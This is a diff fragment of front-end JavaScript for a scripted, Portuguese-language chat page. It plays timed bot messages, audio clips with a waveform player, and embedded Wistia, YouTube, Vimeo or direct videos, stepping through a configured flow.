+        function formatSecs(secs) {
+          if (isNaN(secs) || secs === 0) return '0:00';
+          const m = Math.floor(secs / 60);
+          const s = Math.floor(secs % 60);
+          return m + ':' + (s < 10 ? '0' : '') + s;
+        }
+
+        function updateWaveform(currentTime, duration) {
+          const percent = duration > 0 ? (currentTime / duration) * 100 : 0;
+          const bars = waveform.querySelectorAll('.wave-bar');
+          bars.forEach(function(bar, idx) {
+            const barPercent = (idx / bars.length) * 100;
+            bar.style.backgroundColor = barPercent <= percent ? '#3797F0' : '#525252';
+          });
+        }
+
+        audio.addEventListener('loadedmetadata', function() {
+          if (audio.duration && !isNaN(audio.duration)) {
+            timeSpan.textContent = formatSecs(audio.duration);
+          }
+        });
+
+        audio.addEventListener('timeupdate', function() {
+          timeSpan.textContent = formatSecs(audio.currentTime);
+          updateWaveform(audio.currentTime, audio.duration || 16);
+        });
+
+        audio.addEventListener('play', function() {
+          playBtn.innerHTML = '<i data-lucide="pause" class="w-5 h-5 fill-white"></i>';
+          safeCreateIcons();
+        });
+
+        audio.addEventListener('pause', function() {
+          playBtn.innerHTML = '<i data-lucide="play" class="w-5 h-5 fill-white ml-0.5"></i>';
+          safeCreateIcons();
+        });
+
+        audio.addEventListener('ended', function() {
+          playBtn.innerHTML = '<i data-lucide="play" class="w-5 h-5 fill-white ml-0.5"></i>';
+          audio.currentTime = 0;
+          updateWaveform(0, audio.duration || 16);
+          timeSpan.textContent = formatSecs(audio.duration || 16);
+          safeCreateIcons();
+          triggerEndedOnce();
+        });
+
+        playBtn.onclick = function() {
+          if (audio.paused) {
+            audio.play().catch(function(e) { console.log(e); });
+          } else {
+            audio.pause();
+          }
+        };
+
+        waveform.onclick = function(e) {
+          const rect = waveform.getBoundingClientRect();
+          const clickX = e.clientX - rect.left;
+          const progress = Math.max(0, Math.min(1, clickX / rect.width));
+          if (audio.duration) {
+            audio.currentTime = progress * audio.duration;
+          }
+        };
+
+        speedBtn.onclick = function() {
+          if (playbackRate === 1) playbackRate = 1.5;
+          else if (playbackRate === 1.5) playbackRate = 2;
+          else playbackRate = 1;
+          audio.playbackRate = playbackRate;
+          speedBtn.textContent = playbackRate + 'x';
+        };
+
+        // Try autoplay
+        const playPromise = audio.play();
+        if (playPromise !== undefined) {
+          playPromise.catch(function() {
+            // Autoplay deferred for click
+          });
+        }
+
+        // Safety fallback timer if audio doesn't play
+        setTimeout(function() {
+          if (audio.paused && audio.currentTime === 0) {
+            triggerEndedOnce();
+          }
+        }, 22000);
+      }, 50);
+
+      return container;
+    }
+
+    function getWistiaMediaId(rawUrl) {
+      if (!rawUrl) return null;
+      var m = rawUrl.match(/(?:wistia\.(?:com|net)\/(?:medias|embed\/iframe)\/|wistia_async_)([a-zA-Z0-9_-]+)/i);
+      return m ? m[1] : null;
+    }
+
+    function getYouTubeVideoId(rawUrl) {
+      if (!rawUrl) return null;
+      var m = rawUrl.match(/(?:youtube\.com\/(?:watch\?.*v=|shorts\/|embed\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/i);
+      return m ? m[1] : null;
+    }
+
+    function formatVideoEmbedUrl(rawUrl) {
+      if (!rawUrl) return '';
+      const trimmed = rawUrl.trim();
+      const wistiaId = getWistiaMediaId(trimmed);
+      if (wistiaId) {
+        return 'https://fast.wistia.net/embed/iframe/' + wistiaId + '?videoFoam=true&autoPlay=true';
+      }
+      const ytId = getYouTubeVideoId(trimmed);
+      if (ytId) {
+        return 'https://www.youtube.com/embed/' + ytId + '?enablejsapi=1&autoplay=1&loop=0&controls=1&rel=0&modestbranding=1';
+      }
+      const vimeoMatch = trimmed.match(/vimeo\.com\/(?:video\/)?([0-9]+)/i);
+      if (vimeoMatch && vimeoMatch[1]) {
+        return 'https://player.vimeo.com/video/' + vimeoMatch[1] + '?autoplay=1&api=1';
+      }
+      return trimmed;
+    }
+
+    function isDirectVideoFile(url) {
+      if (!url) return false;
+      const clean = url.split('?')[0].toLowerCase();
+      return clean.endsWith('.mp4') || clean.endsWith('.webm') || clean.endsWith('.ogg') || clean.endsWith('.mov');
+    }
+
+    function createVideoBubble(step, onEndedCallback) {
+      const container = document.createElement('div');
+      container.className = 'flex items-end self-start space-x-2 my-1 animate-pop-in max-w-[92%] sm:max-w-md';
+
+      const rawVUrl = step.videoUrl || config.videoEmbedUrl || 'https://www.image2url.com/r2/default/videos/1788282663673-f47140ee-13d0-4f21-9740-203d578478e7.mp4';
+      const formattedVUrl = formatVideoEmbedUrl(rawVUrl);
+      const isDirect = isDirectVideoFile(rawVUrl);
+      const wistiaId = getWistiaMediaId(rawVUrl);
+      const ytId = getYouTubeVideoId(rawVUrl);
+
+      const bubbleId = 'vid_' + Math.random().toString(36).substring(2, 9);
+      let videoBoxHtml = '';
+      if (isDirect) {
+        videoBoxHtml = '<div class="w-full rounded-xl overflow-hidden bg-black shadow-inner border border-neutral-800 flex items-center justify-center">' +
+          '<video id="' + bubbleId + '" class="w-full max-h-[520px] object-contain rounded-xl" src="' + rawVUrl + '" controls playsinline autoplay></video>' +
+        '</div>';
+      } else {
+        videoBoxHtml = '<div class="aspect-video w-full rounded-xl overflow-hidden bg-black shadow-inner border border-neutral-800 relative">' +
+          '<iframe id="' + bubbleId + '" class="w-full h-full absolute inset-0" src="' + formattedVUrl + '" title="Vídeo" frameborder="0" scrolling="no" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>' +
+        '</div>';
+      }
+
+      container.innerHTML = '<img src="' + config.avatarUrl + '" alt="Avatar" class="w-7 h-7 rounded-full flex-shrink-0 object-cover border border-[#333] mb-0.5" />' +
+        '<div class="bg-[#262626] border border-[#333]/50 rounded-2xl rounded-bl-sm p-3.5 text-white text-sm shadow-md overflow-hidden w-full">' +
+          '<div class="w-full">' +
+            videoBoxHtml +
+            '<div class="mt-2.5 flex items-center justify-between gap-2 border-t border-[#333]/70 pt-2 text-xs text-neutral-400">' +
+              '<span id="status_' + bubbleId + '" class="flex items-center gap-1.5 text-neutral-400">' +
+                '<span class="w-2 h-2 rounded-full bg-blue-500 animate-ping inline-block"></span> Assistindo vídeo...' +
+              '</span>' +
+              '<button id="btn_skip_' + bubbleId + '" class="text-[11px] font-semibold text-blue-400 hover:text-blue-300 flex items-center gap-0.5 bg-blue-950/40 px-2.5 py-1 rounded-md border border-blue-800/40 cursor-pointer">' +
+                'Continuar <i data-lucide="chevron-right" class="w-3 h-3"></i>' +
+              '</button>' +
+            '</div>' +
+            (step.message ? '<div class="mt-2 text-neutral-200 text-sm leading-relaxed whitespace-pre-line">' + step.message + '</div>' : '') +
+          '</div>' +
+        '</div>';
+
+      let endedTriggered = false;
+      function triggerEndedOnce() {
+        if (!endedTriggered) {
+          endedTriggered = true;
+          const statusEl = document.getElementById('status_' + bubbleId);
+          const skipBtn = document.getElementById('btn_skip_' + bubbleId);
+          if (statusEl) {
+            statusEl.className = 'flex items-center gap-1 text-emerald-400 font-medium';
+            statusEl.innerHTML = '<i data-lucide="check" class="w-3.5 h-3.5"></i> Vídeo finalizado';
+            safeCreateIcons();
+          }
+          if (skipBtn) skipBtn.style.display = 'none';
+
+          if (typeof onEndedCallback === 'function') {
+            onEndedCallback();
+          }
+        }
+      }
+
+      setTimeout(function() {
+        const skipBtn = document.getElementById('btn_skip_' + bubbleId);
+        if (skipBtn) {
+          skipBtn.onclick = function() {
+            triggerEndedOnce();
+          };
+        }
+
+        // Direct video
+        const vidEl = document.getElementById(bubbleId);
+        if (isDirect && vidEl) {
+          vidEl.onended = triggerEndedOnce;
+        }
+
+        // Wistia
+        if (wistiaId) {
+          if (!document.getElementById('wistia-e-v1-script')) {
+            const sc = document.createElement('script');
+            sc.id = 'wistia-e-v1-script';
+            sc.src = 'https://fast.wistia.com/assets/external/E-v1.js';
+            sc.async = true;
+            document.head.appendChild(sc);
+          }
+          window._wq = window._wq || [];
+          window._wq.push({
+            id: wistiaId,
+            onReady: function(v) {
+              v.bind('end', triggerEndedOnce);
+            }
+          });
+        }
+
+        // Window message listener for postMessages
+        window.addEventListener('message', function(ev) {
+          try {
+            if (typeof ev.data === 'string') {
+              if (ev.data.indexOf('"event":"end"') !== -1 || ev.data.indexOf('"state":"ended"') !== -1 || ev.data.indexOf('"ended"') !== -1) {
+                triggerEndedOnce();
+              }
+              const p = JSON.parse(ev.data);
+              if ((p.event === 'onStateChange' && p.info === 0) || p.event === 'ended') {
+                triggerEndedOnce();
+              }
+            } else if (typeof ev.data === 'object' && ev.data !== null) {
+              if ((ev.data.event === 'onStateChange' && ev.data.info === 0) || ev.data.event === 'ended' || ev.data.type === 'ended') {
+                triggerEndedOnce();
+              }
+            }
+          } catch(e) {}
+        });
+      }, 50);
+
+      return container;
+    }
+
+    function runChatStep(stepIdx) {
+      if (!config.flow || stepIdx >= config.flow.length) return;
+
+      const step = config.flow[stepIdx];
+      const typingIndicator = document.getElementById('typing-indicator');
+      const messagesList = document.getElementById('messages-list');
+
+      typingIndicator.classList.remove('hidden');
+      typingIndicator.classList.add('flex');
+      scrollToBottom();
+
+      const delay = step.delay !== undefined ? step.delay : 1500;
+
+      if (currentTimer) clearTimeout(currentTimer);
+
+      currentTimer = setTimeout(function() {
+        typingIndicator.classList.remove('flex');
+        typingIndicator.classList.add('hidden');
+
+        if (step.isAudio && step.audioUrl) {
+          const nextIdx = step.next !== undefined ? step.next : stepIdx + 1;
+          const audioBubble = createAudioBubble(step.audioUrl, function() {
+            if (nextIdx < config.flow.length) {
+              setTimeout(function() {
+                runChatStep(nextIdx);
+              }, 800);
+            }
+          });
+          messagesList.appendChild(audioBubble);
+        } else if (step.isVideo) {
+          const nextIdx = step.next !== undefined ? step.next : stepIdx + 1;
+          const videoBubble = createVideoBubble(step, function() {
+            if (nextIdx < config.flow.length) {
+              setTimeout(function() {
+                runChatStep(nextIdx);
+              }, 700);
+            }
+          });
+          messagesList.appendChild(videoBubble);
+        } else {
+          const botBubble = document.createElement('div');
+          botBubble.className = 'flex items-end self-start space-x-2 my-1 animate-pop-in max-w-[92%] sm:max-w-md';
+          const innerContent = '<div class="text-neutral-100 text-sm leading-relaxed whitespace-pre-line">' + step.message + '</div>';
+
+          botBubble.innerHTML = '<img src="' + config.avatarUrl + '" alt="Avatar" class="w-7 h-7 rounded-full flex-shrink-0 object-cover border border-[#333] mb-0.5" />' +
+            '<div class="bg-[#262626] border border-[#333]/50 rounded-2xl rounded-bl-sm p-3.5 text-white text-sm shadow-md overflow-hidden w-full">' + innerContent + '</div>';
+
+          messagesList.appendChild(botBubble);
+        }
+
+        safeCreateIcons();
+        scrollToBottom();
+
+        // 1. If options present, show options
+        if (step.options && step.options.length > 0) {
+          setTimeout(function() {
+            renderOptions(step.options);
+          }, 300);
+        }
+        // 2. If audio, waiting for audio end callback
+        else if (step.isAudio) {
+          // Audio callback handles advancing
+        }
+        // 3. If video, waiting for video completion callback
+        else if (step.isVideo) {
+          // Video callback handles advancing
+        }
+        // 4. Regular message auto-advance
+        else {
+          const nextIdx = step.next !== undefined ? step.next : stepIdx + 1;
+          if (nextIdx < config.flow.length) {
+            runChatStep(nextIdx);
+          }
+        }
+      }, delay);
+    }
+
+    function startChat() {
+      if (currentTimer) clearTimeout(currentTimer);
+      document.getElementById('messages-list').innerHTML = '';
+      document.getElementById('options-container').classList.add('hidden');
+      setTimeout(function() {
+        runChatStep(0);
+      }, 400);
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      safeCreateIcons();
+      startChat();
+    });
+  </script>
+</body>
 </html>
-
